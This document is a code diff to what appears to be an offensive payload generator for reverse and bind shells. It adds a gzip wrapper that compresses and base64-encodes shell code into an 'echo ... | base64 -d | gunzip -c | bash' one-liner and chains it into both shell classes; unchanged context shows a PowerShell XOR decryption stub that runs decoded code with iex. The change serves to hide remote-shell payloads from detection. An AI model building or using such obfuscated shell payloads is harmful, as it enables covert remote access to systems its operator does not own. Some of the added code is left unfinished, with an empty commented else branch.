@@ -1,4 +1,5 @@
-from encoders import powershell_base64, xor, to_unicode, to_urlencode
+from obfuscators import randomize_vars
+from encoders import powershell_base64, xor, gzip_compress, to_unicode, to_urlencode
 from binascii import hexlify
 from binary import shellcode_to_hex, shellcode_to_ps1, WINDOWS_BLOODSEEKER_SCRIPT # imported since 0.3.6
 from sys import exit
@@ -104,6 +105,21 @@ def xor_wrapper(name, code, args, shell="/bin/bash"):
         code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
         code = """ $k={0};$b='{1}';$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
         code = prefix + "-Command " + '"%s"' % code
+    return code
+
+
+def gzip_wrapper(name, code, args, shell="/bin/bash"):
+    if args.shell is not "":
+        shell = args.shell
+    if args.gzip is True:
+        if "powershell" not in name.lower():
+            if "windows" not in name.lower():
+                code = gzip_compress(code)
+                code = code.encode("base64").replace("\n", "")
+                code = "echo {0}|base64 -d|gunzip -c|{1}".format(code, shell)
+        #else:
+            
+
     return code
 
 
@@ -217,6 +233,9 @@ class ReverseShell(object):
         # Apply xor encoding.
         self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)
 
+        # Apply gzip compression
+        self.code = gzip_wrapper(self.name, self.code, self.args)
+
         # Apply base64 encoding.
         self.code = base64_wrapper(self.name, self.code, self.args)
 
@@ -248,6 +267,9 @@ class BindShell(object):
 
         # Apply xor encoding.
         self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)
+
+        # Apply gzip compression
+        self.code = gzip_wrapper(self.name, self.code, self.args)
 
         # Apply base64 encoding.
         self.code = base64_wrapper(self.name, self.code, self.args)
